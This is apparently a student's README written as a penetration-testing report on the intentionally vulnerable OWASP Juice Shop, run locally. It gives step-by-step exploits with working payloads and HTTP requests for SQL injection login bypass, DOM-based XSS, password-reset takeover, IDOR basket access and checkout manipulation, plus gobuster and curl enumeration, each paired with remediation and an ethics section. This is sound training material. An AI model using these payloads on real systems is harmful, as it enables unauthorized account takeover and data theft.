# 🔍 VulnHunter — OWASP Juice Shop Vulnerability Research

<div align="center">

![OWASP](https://img.shields.io/badge/OWASP-Top%2010-red?style=for-the-badge&logo=owasp)
![Docker](https://img.shields.io/badge/Docker-Ready-blue?style=for-the-badge&logo=docker)
![Security](https://img.shields.io/badge/Purpose-Ethical%20Hacking-green?style=for-the-badge&logo=hackthebox)
![Status](https://img.shields.io/badge/Status-Research%20Lab-orange?style=for-the-badge)

> **Penetration Testing Report** — Vulnerabilities identified, exploited, and documented in the OWASP Juice Shop intentionally vulnerable web application.

</div>

---

## ⚠️ Legal Disclaimer

> This project is for **educational purposes only**. All testing was performed exclusively on the intentionally vulnerable OWASP Juice Shop running locally in an isolated Docker container. No unauthorized systems were targeted. The techniques documented here must only be used with **explicit written permission** from system owners.

---

## 🌐 What is OWASP?

**OWASP** (Open Worldwide Application Security Project) is a **non-profit foundation** dedicated to improving software security. It provides free, community-driven resources including:

- **OWASP Top 10** — the industry-standard list of the 10 most critical web application security risks, updated every few years based on real-world data from thousands of organizations.
- **OWASP Juice Shop** — an intentionally vulnerable web application built specifically for security training, awareness demos, and penetration testing practice.
- **OWASP ZAP** — a free, open-source automated security scanner used by developers and security professionals worldwide.
- **OWASP Testing Guide** — a comprehensive methodology for web application penetration testing.

All vulnerabilities documented in this report are mapped to the **OWASP Top 10 (2021 edition)**.

---

## 📋 Table of Contents

1. [Project Overview](#project-overview)
2. [Setup & Installation](#setup--installation)
3. [Infrastructure Vulnerability Analysis](#infrastructure-vulnerability-analysis)
4. [Exploit Reports](#exploit-reports)
   - [1. SQL Injection (SQLi)](#1-sql-injection-sqli)
   - [2. Cross-Site Scripting (XSS)](#2-cross-site-scripting-xss)
   - [3. Broken Authentication](#3-broken-authentication)
   - [4. Insecure Direct Object Reference (IDOR)](#4-insecure-direct-object-reference-idor)
   - [5. Security Misconfiguration — robots.txt & FTP Exposure](#5-security-misconfiguration--robotstxt-reveals-sensitive-paths--ftp-exposure)
   - [6. Broken Access Control — Admin Basket Manipulation ⭐ Bonus](#6-broken-access-control--admin-basket-manipulation--bonus)
5. [Ethical Hacking Report](#ethical-hacking-report)
6. [Resources](#resources)

---

## Project Overview

| Field             | Details                                |
|-------------------|----------------------------------------|
| **Target**        | OWASP Juice Shop                       |
| **Environment**   | Local Docker container (isolated)      |
| **Scope**         | `http://localhost:3000`                |
| **Methodology**   | OWASP Testing Guide v4, PTES           |
| **Vulnerabilities Found** | 6 (5 mandatory + 1 bonus)     |
| **OWASP ZAP Scan**| ✅ Performed                          |
| **Dockerfile Analysis** | ✅ Performed                    |

---

## Setup & Installation

### Prerequisites

- [Docker](https://docs.docker.com/get-docker/) installed and running
- Port `3000` available on localhost

### Option 1 — Quick Start (Docker Hub)

```bash
docker pull bkimminich/juice-shop
docker run --rm -p 3000:3000 bkimminich/juice-shop
```

### Option 2 — Using This Repository's Dockerfile

```bash
# Clone the repository
git clone https://github.com/fahdaguenouz/vuln-hunter.git
cd vuln-hunter

# Build and run
docker build -t vuln-hunter-lab .
docker run --rm -p 3000:3000 vuln-hunter-lab
```

### Access the Application

Open your browser and navigate to:

```
http://localhost:3000
```

---

## Infrastructure Vulnerability Analysis ⭐ Bonus



The OWASP Juice Shop Docker image (v20) was analyzed for infrastructure vulnerabilities:

| # | Issue | Severity | CWE |
|---|-------|----------|-----|
| 1 | **Unpinned `latest` tag** — No reproducibility; supply-chain risk | Medium | CWE-829 |
| 2 | **Process runs as root** — Container process has UID 0 (Resolved in v20+) | High | CWE-250 |
| 3 | **No read-only filesystem** — Container FS is writable | Medium | CWE-732 |
| 4 | **No resource limits** — No CPU/memory caps (DoS risk) | Medium | CWE-400 |
| 5 | **Port 3000 directly exposed** — No reverse proxy or TLS | High | CWE-319 |
| 6 | **No secrets management** — JWT secret hardcoded in source | Critical | CWE-798 |
| 7 | **Outdated Node.js dependencies** — npm audit reports known CVEs | High | CWE-1035 |

---

## Exploit Reports

---

### 1. SQL Injection (SQLi)

**OWASP Category**: A03:2021 — Injection  
**Severity**: 🔴 Critical  
**CWE**: CWE-89

#### Description

SQL Injection occurs when user-supplied input is embedded directly into a SQL query without sanitization, allowing an attacker to alter query logic.

#### How It Was Exploited

The login form at `http://localhost:3000/#/login` was targeted.

**Step 1** — Open the login page and launch an intercepting proxy (Burp Suite / ZAP).

**Step 2** — Enter the following payload in the **Email** field:

```
' OR 1=1--
```

**Step 3** — Enter any value in the **Password** field and submit.

**Step 4** — The application logs in as the **admin** user (first record in the `Users` table) without requiring valid credentials.

**Proof of Concept (HTTP Request)**:

```http
POST /rest/user/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{"email":"' OR 1=1--","password":"anything"}
```

**Response**: HTTP 200 with a valid JWT token for the admin account.

#### Root Cause

The backend constructs the SQL query by string concatenation:
```sql
SELECT * FROM Users WHERE email = '<input>' AND password = '<hash>'
```
The `' OR 1=1--` payload closes the email string, adds a always-true condition, and comments out the rest of the query.

#### Impact

- Complete authentication bypass
- Access to all user accounts (admin escalation)
- Potential for data exfiltration, modification, and deletion across the entire database

#### Remediation

1. **Use parameterized queries / prepared statements** — Never concatenate user input into SQL strings.
2. **Use an ORM** (e.g., Sequelize) with proper query binding.
3. **Input validation** — Reject inputs containing SQL metacharacters where not expected.
4. **Least privilege** — The database user should have only SELECT rights on necessary tables.
5. **WAF** — Deploy a Web Application Firewall to detect and block common SQLi patterns.

---

### 2. Cross-Site Scripting (XSS)

**OWASP Category**: A03:2021 — Injection  
**Severity**: 🟠 High  
**CWE**: CWE-79

#### Description

XSS allows attackers to inject client-side scripts into web pages viewed by other users. Juice Shop is vulnerable to both **Reflected** and **DOM-based** XSS.

#### How It Was Exploited

**DOM-based XSS — Search Field**

**Step 1** — Navigate to the search bar at `http://localhost:3000/#/search?q=`.

**Step 2** — Enter the following payload and press Enter:

```html
<iframe src="javascript:alert('XSS')">
```

**Step 3** — The browser executes the script and renders an alert popup, confirming script execution in the victim's browser context. Angular processes the URL parameter and renders it without proper sanitization.

**DOM-based XSS — Track Order Page**

**Step 1** — Navigate to:

```
http://localhost:3000/#/track-result?id=<script>alert('DOM-XSS')</script>
```

**Step 2** — The page reads the `id` parameter from the URL and renders it without sanitization into the DOM, triggering script execution.

#### Impact

- **Session hijacking** — Steal `document.cookie` / `localStorage` tokens
- **Credential phishing** — Inject fake login forms
- **Malware distribution** — Redirect users to attacker-controlled pages
- **CSRF amplification** — Perform actions on behalf of authenticated users

#### Remediation

1. **Output encoding** — HTML-encode all user-supplied data before rendering (use libraries like DOMPurify).
2. **Content Security Policy (CSP)** — Add a strict `Content-Security-Policy` header to block inline scripts.
3. **HttpOnly & Secure cookie flags** — Prevent JavaScript access to session cookies.
4. **Angular / React built-in escaping** — Avoid using `[innerHTML]` or `dangerouslySetInnerHTML` with user data.

---

### 3. Broken Authentication

**OWASP Category**: A07:2021 — Identification and Authentication Failures  
**Severity**: 🟠 High  
**CWE**: CWE-287

#### Description

Juice Shop exposes a weak password reset mechanism that allows account takeover without knowing the victim's original password.

#### How It Was Exploited

**Scenario**: Taking over the admin account via the "Forgot Password" flow.

**Step 1** — Navigate to `http://localhost:3000/#/forgot-password`.

**Step 2** — Enter the admin's known email: `admin@juice-sh.op`

**Step 3** — The security question is revealed: *"Mother's maiden name?"*
**source code questions** -`https://raw.githubusercontent.com/juice-shop/juice-shop/v20.0.0/data/static/securityQuestions.yml`
**source code** -`https://raw.githubusercontent.com/juice-shop/juice-shop/v20.0.0/data/static/users.yml`

**Step 4** — The answer (`@xI98PxDO+06!`) is embedded in the Juice Shop source code / challenge hints. Enter it.

**Step 5** — Set a new password and log in as admin.


#### Impact
- Full account takeover of any user (including admin)
- Bypass of all access controls
- Data theft and privilege escalation

#### Remediation

1. **Rate-limit password reset requests** — Prevent brute-force enumeration.
2. **Use cryptographically strong JWT secrets** — Minimum 256-bit random secret; store in a secrets manager (e.g., HashiCorp Vault).
3. **JWT expiry** — Enforce short-lived tokens with proper refresh token rotation.

---

### 4. Insecure Direct Object Reference (IDOR)

**OWASP Category**: A01:2021 — Broken Access Control  
**Severity**: 🟠 High  
**CWE**: CWE-639

#### Description

IDOR occurs when an application exposes internal object references (e.g., database IDs) in URLs or API parameters without verifying the requesting user has authorization to access that object.

#### How It Was Exploited

**Scenario**: Accessing another user's shopping basket.

**Step 1** — Log in as a regular user (e.g., `jim@juice-sh.op`).

**search for security quetions** - `https://en.wikipedia.org/wiki/James_T._Kirk`
```
Samuel
```
**Step 2** — Add an item to your basket. Intercept the request:

```http
GET /rest/basket/2 HTTP/1.1
Authorization: Bearer <your_jwt>
```

**Step 3** — Change the basket ID from `2` to `1` (the admin's basket):

```http
GET /rest/basket/1 HTTP/1.1
Authorization: Bearer <your_jwt>
```

**Step 4** — The server returns the admin's basket contents without any authorization check.

#### Impact

- Access to private data of any user (orders, personal information, payment details)
- Ability to modify or delete other users' resources

#### Remediation

1. **Server-side authorization checks** — Verify that the authenticated user owns the requested resource on every request.
2. **Indirect references** — Use non-guessable, user-specific tokens (UUIDs) instead of sequential integer IDs.
3. **Access control unit tests** — Test every API endpoint with tokens belonging to different users.

---

### 5. Security Misconfiguration — robots.txt Reveals Sensitive Paths & FTP Exposure

**OWASP Category**: A05:2021 — Security Misconfiguration  
**Severity**: 🟠 High  
**CWE**: CWE-538 (File and Directory Information Exposure)

#### Description

The application's `robots.txt` file is intended to instruct web crawlers not to index certain paths — but in doing so, it acts as a **roadmap for attackers**, explicitly listing sensitive directories. Additionally, the `/ftp` directory is publicly accessible with full directory listing enabled, exposing internal backup files.

#### How It Was Exploited

**Step 1** — Run a directory brute-force scan against the server-side endpoints (Juice Shop is a SPA so `--exclude-length` is required to filter the catch-all `index.html` response):

```bash
gobuster dir -u http://localhost:3000 \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 50 --quiet \
  --exclude-length 9393
```

**Output**:
```
robots.txt           (Status: 200) [Size: 28]
ftp                  (Status: 200) [Size: 11307]
assets               (Status: 301) [Size: 156]
promotion            (Status: 200) [Size: 5863]
```

**Step 2** — Fetch `robots.txt` to see which paths the application is trying to hide:

```bash
curl http://localhost:3000/robots.txt
```

**Output**:
```
User-agent: *
Disallow: /ftp
```

The `robots.txt` file **reveals the existence of `/ftp`** to any attacker who reads it.

**Step 3** — Navigate to the exposed FTP directory:

```bash
curl http://localhost:3000/ftp/
```

The server returns a **full directory listing** of internal files including:

```
acquisitions.md
eastere.gg
package.json.bak
suspicious_errors.yml
```

**Step 4** — Download sensitive files:

```bash
# Reveals all npm dependency versions — enabling targeted CVE research
curl http://localhost:3000/ftp/package.json.bak

# Internal business document
curl http://localhost:3000/ftp/acquisitions.md
```

#### Impact

- `robots.txt` acts as a **secret map** — disclosing paths that were meant to be hidden
- `package.json.bak` reveals all npm dependencies and exact versions, enabling targeted CVE exploitation
- `acquisitions.md` exposes confidential internal business documents
- No authentication is required to access any of these files

#### Remediation

1. **Never list sensitive paths in `robots.txt`** — use `X-Robots-Tag: noindex` HTTP headers instead.
2. **Disable directory listing** — configure the web server to return 403/404 for directory index requests.
3. **Remove backup files from web-accessible directories** — `.bak`, `.old`, `.orig` files must never be served publicly.
4. **Move internal files** — store sensitive documents behind authenticated API endpoints, not in static file directories.

---


### 6. Broken Access Control — Admin Basket Manipulation ⭐ Bonus

**OWASP Category**: A01:2021 — Broken Access Control  
**Severity**: 🔴 Critical  
**CWE**: CWE-285

#### Description

The checkout API endpoint uses a basket ID embedded in the **URL path** to identify whose basket to process. The server never validates that the authenticated user actually owns that basket — allowing any logged-in user to checkout (place an order) on behalf of any other user.

#### How It Was Exploited

**Step 1** — Log in as a regular user (`jim@juice-sh.op`) and add an item to the cart. Intercept the checkout request using Burp Suite / OWASP ZAP:

```http
POST /rest/basket/2/checkout HTTP/1.1
Host: localhost:3000
Authorization: Bearer <jim_jwt>
Content-Type: application/json

{"couponData":"bnVsbA==","orderDetails":{"paymentId":"5","addressId":"4","deliveryMethodId":"3"}}
```

The number `2` in the URL is Jim's basket ID (visible in the JWT payload: `"bid":2`).

**Step 2** — Change the basket ID in the URL from `2` to `1` (the admin's basket) and forward the request — keeping Jim's JWT unchanged:

```http
POST /rest/basket/1/checkout HTTP/1.1
Host: localhost:3000
Authorization: Bearer <jim_jwt>
Content-Type: application/json

{"couponData":"bnVsbA==","orderDetails":{"paymentId":"5","addressId":"4","deliveryMethodId":"3"}}
```

**Step 3** — The server responds with HTTP **200 OK** and processes the checkout against the **admin's basket** — using Jim's session. The admin's order history now shows a fraudulent order placed without their knowledge.

> **Why it works**: The server extracts the basket ID from the URL path and queries it directly from the database without checking `WHERE userId = authenticatedUserId`.

#### Impact

- **Fraudulent orders** placed against any user account without their knowledge or consent
- **Financial manipulation** — an attacker could empty or manipulate another user's cart before checkout
- **Privacy violation** — the basket contents (items, delivery address, payment method ID) of any user are exposed
- **Privilege escalation via chaining** — combine with SQLi admin login to manipulate high-value accounts

#### Remediation

1. **Derive basket ID from the authenticated JWT** — the server must look up the basket by `userId` from the token, never from the URL path or request body.
2. **Authorization middleware** — add a guard on every basket endpoint that asserts `basket.userId === req.user.id`.
3. **Audit logging** — log and alert on checkout requests where the URL basket ID does not match the JWT `bid` claim.

---

## Ethical Hacking Report

### Overview

This report documents the ethical responsibilities, legal considerations, and professional standards followed throughout the VulnHunter project.

---

### 1. Authorization and Scope

> **The most fundamental principle of ethical hacking: never test what you do not have explicit permission to test.**

For this project:

- All testing was performed **exclusively** on the OWASP Juice Shop running locally in an isolated Docker container (`http://localhost:3000`).
- The OWASP Juice Shop is a **purposely vulnerable application** created specifically for security training — it comes with **implicit authorization** for security testing.
- No live, production, or third-party systems were ever targeted.
- The scope was strictly limited to the local network interface (`127.0.0.1`).

**In a professional engagement**, authorization would be established via:
- A signed **Rules of Engagement (RoE)** document
- A written **Penetration Testing Agreement**
- Clearly defined **scope boundaries** (IP ranges, domains, application components)
- An agreed **testing window** to minimize business disruption

---

### 2. Legal and Ethical Boundaries

Security testing without authorization is illegal under laws including:

| Jurisdiction | Law |
|---|---|
| 🇺🇸 United States | Computer Fraud and Abuse Act (CFAA) |
| 🇪🇺 European Union | Directive on Attacks Against Information Systems (2013/40/EU) |
| 🇬🇧 United Kingdom | Computer Misuse Act 1990 |
| 🌍 International | Budapest Convention on Cybercrime |

**Ethical principles followed in this project:**

- ✅ **Lawfulness** — Only tested systems with legal authorization
- ✅ **Confidentiality** — No real user data was accessed or exfiltrated
- ✅ **Non-maleficence** — No disruption to services or data destruction
- ✅ **Data minimization** — Did not store unnecessary sensitive data
- ✅ **Transparency** — All findings are documented honestly and accurately

---

### 3. Responsible Vulnerability Disclosure

In a real-world scenario, discovered vulnerabilities would be reported following the **ISO/IEC 29147** standard for vulnerability disclosure:

**Responsible Disclosure Process:**

1. **Document** the vulnerability with full reproduction steps and proof-of-concept.
2. **Identify** the appropriate security contact (security@company.com, HackerOne, Bugcrowd).
3. **Report privately** — never publicly disclose before the vendor has had time to remediate.
4. **Agree on a disclosure timeline** — typically 90 days (following Google Project Zero guidelines).
5. **Coordinate public disclosure** once a patch is available.
6. **Avoid** sharing exploit code publicly before a fix is in place.

For the OWASP Juice Shop, all vulnerabilities are **intentionally included** and publicly known — no disclosure was required. The Juice Shop project itself maintains a [public list of all challenges](https://github.com/juice-shop/juice-shop#challenges-covered-in-the-book-owasp-juice-shop---pwning-owasp-juice-shop).

---

### 4. Professional Conduct

As a Security Consultant / Penetration Tester, the following professional standards were maintained:

- **Objectivity** — Vulnerabilities are reported as found, without exaggeration or minimization.
- **Accuracy** — All exploitation steps are reproducible and verified.
- **Professionalism** — Findings are communicated clearly for both technical and non-technical audiences.
- **Continuous Learning** — Techniques and methodologies are kept current with evolving threat landscapes.
- **Community Contribution** — Knowledge is shared responsibly to improve the security community.

---


## Resources

| Resource | Link |
|----------|------|
| OWASP Juice Shop GitHub | https://github.com/juice-shop/juice-shop |
| OWASP Top 10 (2021) | https://owasp.org/www-project-top-ten/ |
| OWASP ZAP | https://owasp.org/www-project-zap/ |
| OWASP Testing Guide v4 | https://owasp.org/www-project-web-security-testing-guide/ |
| Juice Shop Docker Image | https://hub.docker.com/r/bkimminich/juice-shop |
| Hacksplaining OWASP Top 10 | https://www.hacksplaining.com/owasp |
| PortSwigger Web Security Academy | https://portswigger.net/web-security |
| Burp Suite Community Edition | https://portswigger.net/burp/communitydownload |
| jwt_tool | https://github.com/ticarpi/jwt_tool |
| Gobuster | https://github.com/OJ/gobuster |

---

<div align="center">

Made with ❤️ for ethical security research.  
**Never hack what you don't own or have permission to test.**

</div>
